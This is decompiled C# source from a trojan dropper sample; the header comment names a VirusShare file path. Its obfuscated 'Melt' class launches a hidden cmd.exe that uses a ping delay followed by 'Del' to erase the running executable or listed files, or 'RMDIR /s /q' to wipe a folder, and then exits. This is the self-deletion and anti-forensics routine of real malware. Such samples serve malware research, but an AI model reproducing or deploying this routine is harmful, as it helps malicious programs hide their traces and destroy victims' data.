// Decompiled with JetBrains decompiler
// Type: YhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQ.Melt
// Assembly: rCWkXKkHG, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4D884AA0-6931-492A-BF88-91705CD23369
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Dropper.Win32.Dapato.atdt-6d6f9fa7620cf0056d02556ff97c31ce6e6915683c9f12177fc6b506a2dc19c9.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;

namespace YhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQ
{
  public class Melt
  {
    private string _Path;
    private string[] _Files;
    private Melt._What State;
    private int _Time;

    public Melt(string Path, int Time = 3000)
    {
      this._Time = 3000;
      this.State = !Path.Contains(".exe") ? Melt._What.Folder : Melt._What.Proccess;
      this._Path = Path;
      this._Time = Time;
    }

    public Melt(string[] Files, int Time = 3000)
    {
      this._Time = 3000;
      this._Files = Files;
      this._Time = Time;
      this.State = Melt._What.Files;
    }

    public bool Action()
    {
      bool flag;
      try
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.CreateNoWindow = true;
        startInfo.FileName = "cmd.exe";
        if (this.State == Melt._What.Files)
        {
          object Left = (object) ("/C ping 1.1.1.1 -n 1 -w " + this._Time.ToString());
          int num = checked (this._Files.Length - 1);
          int index = 0;
          while (index <= num)
          {
            Left = Operators.AddObject(Left, (object) (" > Nul & Del " + this._Files[index]));
            checked { ++index; }
          }
          startInfo.Arguments = Conversions.ToString(Left);
          Process.Start(startInfo);
        }
        else if (this.State == Melt._What.Folder)
        {
          startInfo.Arguments = "/C RMDIR " + this._Path + " /s /q";
          Process.Start(startInfo);
        }
        else if (this.State == Melt._What.Proccess)
        {
          startInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w " + this._Time.ToString() + " > Nul & Del " + this._Path;
          Process.Start(startInfo);
          Environment.Exit(0);
        }
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public enum _What
    {
      Proccess,
      Folder,
      Files,
    }
  }
}
